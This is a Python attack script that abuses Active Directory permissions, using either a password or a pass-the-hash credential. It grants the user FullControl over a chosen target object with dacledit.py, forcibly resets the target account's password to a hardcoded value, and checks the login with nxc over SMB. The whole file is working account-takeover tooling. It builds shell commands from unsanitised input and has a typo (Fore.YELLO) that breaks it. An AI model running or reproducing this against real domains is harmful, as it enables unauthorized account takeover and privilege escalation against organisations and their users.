import os
import subprocess
from argument_parser import parse_arguments  # Import the parse_arguments function from argument_parser.py

# Install missing dependencies if necessary
try:
    from colorama import Fore
except ImportError:
    os.system("sudo pip install colorama")
# Get the arguments from the argument_parser.py
args = parse_arguments()
# Extract arguments
DOMAIN = args.DomainName
USER = args.Username
PASS = args.Password
HASH = args.PassTheHash  

# Set colorama color constants
RED = Fore.RED
YELLOW = Fore.YELLO
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

def GenericAllHash():
    tar = input(f"{CYAN}Target:{RED} ")
    subprocess.call([f"{RESET}"], shell=True)
    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal {USER} -target {tar} {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    subprocess.call([f"pth-net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%{HASH} -S {DOMAIN}"], shell=True)
    subprocess.call([f"nxc smb {DOMAIN} -u {tar} -p 'P@ssw0rd123!@#'"], shell=True)
    
def GenericAllPass():
    tar = input(f"{CYAN}Target:{RED} ")
    subprocess.call([f"{RESET}"], shell=True)
    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal {USER} -target {tar} {DOMAIN}/{USER}:{PASS}"], shell=True)
    subprocess.call([f"net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%{PASS} -S {DOMAIN}"], shell=True)
    subprocess.call([f"nxc smb {DOMAIN} -u {tar} -p 'P@ssw0rd123!@#'"], shell=True)
def main():
    # Execute the appropriate function based on the parsed arguments
    if HASH:
        GenericAllHash()  
    else:
        GenericAllPass()  

if __name__ == '__main__':
    main()
